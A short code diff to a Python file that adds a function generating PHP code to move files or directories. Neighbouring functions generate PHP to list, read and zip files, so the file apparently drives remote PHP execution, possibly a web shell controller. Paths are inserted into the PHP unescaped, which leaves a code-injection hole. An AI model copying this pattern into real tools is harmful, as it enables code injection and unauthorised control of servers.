@@ -144,6 +144,42 @@ echo json_encode(getDirContents('"""+dirx+"""'));"""
 def file_get_contents(dirx):
     return f"""echo file_get_contents('{dirx}');"""
 
+def simulate_mv(path, newpath):
+    php_code = f"""
+    // Check if the source file or directory exists
+    if (!file_exists('{path}')) {{
+        echo "[✗] Source doesn't exist.";
+        return;
+    }}
+
+    // Check if the destination exists
+    if (file_exists('{newpath}')) {{
+        echo "[!] Destination already exists. Please choose a different destination.";
+        return;
+    }}
+
+    // Check if the source is a file
+    if (is_file('{path}')) {{
+        // Move the file to the destination
+        if (rename('{path}', '{newpath}')) {{
+            echo "[✓] File moved successfully.";
+        }} else {{
+            echo "[✗] Error moving the file.";
+        }}
+    }} elseif (is_dir('{path}')) {{
+        // Move the directory to the destination
+        if (mkdir('{newpath}') && rename('{path}', '{newpath}/' . basename('{path}'))) {{
+            echo "[✓] Directory moved successfully.";
+        }} else {{
+            echo "[✗] Error moving the directory.";
+        }}
+    }} else {{
+        echo "[✗] Unsupported source type.";
+    }}
+    """
+
+    return php_code
+
 #
 def zip_path(path="./"):
     php_zip_code="""// Get real path for our folder
